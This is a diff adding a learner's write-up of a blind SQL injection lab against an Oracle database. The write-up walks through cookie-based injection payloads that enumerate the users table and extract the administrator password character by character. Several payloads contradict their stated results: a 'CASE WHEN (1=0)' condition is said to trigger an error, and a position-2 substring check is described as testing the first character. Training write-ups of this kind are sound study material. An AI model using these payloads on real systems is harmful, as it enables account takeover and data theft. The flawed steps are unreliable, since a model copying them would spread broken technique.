@@ -1,0 +1,51 @@
+This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows. If the SQL query causes an error, then the application returns a custom error message.
+
+The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user. 
+
+Hint:  This lab uses an Oracle database. For more information, see the SQL injection cheat sheet. 
+
+End Goals:
+- Output the administrator password
+- Log in as the administrator user
+
+Analysis:
+--------
+
+1) Prove that parameter is vulnerable
+
+' || (select '' from dual) ||' => oracle database
+
+' || (select '' from dualskdhs) ||' => error
+
+2) confirm that the users table exists in database
+
+' || (select '' from users where rownum = 1) ||'
+- users table exists
+
+3) Confirm that the administrator user exists in the users database
+
+' || (select '' from users where username='administrator') ||'
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) ||'
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') ||'
+- internal server error => administrator user exists
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='kjshdkjshdksjd') ||'
+- 200 response => user does not exists in database
+
+4) Determine length of password
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password) > 50) ||'
+- 200 response at 50 > length of password is less than 50
+- password length is 20 characters
+
+5) Output the administrator password
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password, 2, 1)='a') ||'
+- a is not the first character of the password
+- use includer cluster bomb attack with first payload numbers and second payloads bruteforce
